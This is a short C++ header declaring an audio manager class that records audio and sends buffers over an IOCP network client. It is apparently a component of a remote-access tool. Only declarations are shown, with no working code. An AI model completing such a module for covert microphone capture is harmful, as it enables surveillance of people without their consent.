#pragma once
#include "Manager.h"
#include"Audio.h"
class CAudioManager :
	public CManager
{
public:
	CAudioManager(_CIOCPClient* IOCPClient);
	~CAudioManager();
	virtual  void  HandleIO(PBYTE  BufferData, ULONG_PTR  BufferLength);
	BOOL  OnInitMember();
	static  DWORD  ThreadProcedure(LPVOID ParameterData);
	int   SendRecordBuffer();
private:
	BOOL  m_IsWorking;
	CAudio*  m_Audio;
	HANDLE   m_WorkThreadHandle;
};

